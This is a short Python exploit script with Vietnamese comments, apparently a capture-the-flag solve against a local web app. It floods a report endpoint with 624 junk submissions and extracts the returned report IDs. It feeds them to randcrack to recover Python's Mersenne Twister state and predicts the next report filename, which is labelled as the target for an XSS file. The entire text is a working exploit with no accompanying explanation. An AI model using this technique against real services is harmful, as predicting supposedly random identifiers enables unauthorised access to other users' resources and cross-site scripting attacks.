import requests
import re
from randcrack import RandCrack

URL = "http://localhost:5000"

def crack_prng_v2():
    print("[*] Đang spam 624 reports để thu thập state (Bắt trực tiếp từ response)...")
    rc = RandCrack()
    
    for i in range(624):
        # Gửi rác
        r = requests.post(f"{URL}/submit-report", json={"note": f"CTF_trash_data_{i}"})
        data = r.json()
        
        # Bóc thẳng ID từ cái report_url trả về
        match = re.search(r"report_(\d+)\.html", data.get("report_url", ""))
        if match:
            extracted_id = int(match.group(1))
            rc.submit(extracted_id) # Mớm luôn cho nóng =))
        else:
            print(f"[-] Lỗi cmnr ở request {i}: Không tìm thấy ID! Data: {data}")
            return

        if (i + 1) % 100 == 0:
            print(f"  -> Đã thu thập đúng trình tự {i + 1}/624 IDs...")

    # Crackkkkk
    predicted_id = rc.predict_getrandbits(32)
    print(f"\n[+] BOOM! Trạng thái đã bị crack!")
    print(f"[+] PREDICTED ID (Dành cho file XSS): {predicted_id}")
    print(f"[+] Tên file: report_{predicted_id}.html")

if __name__ == "__main__":
    crack_prng_v2()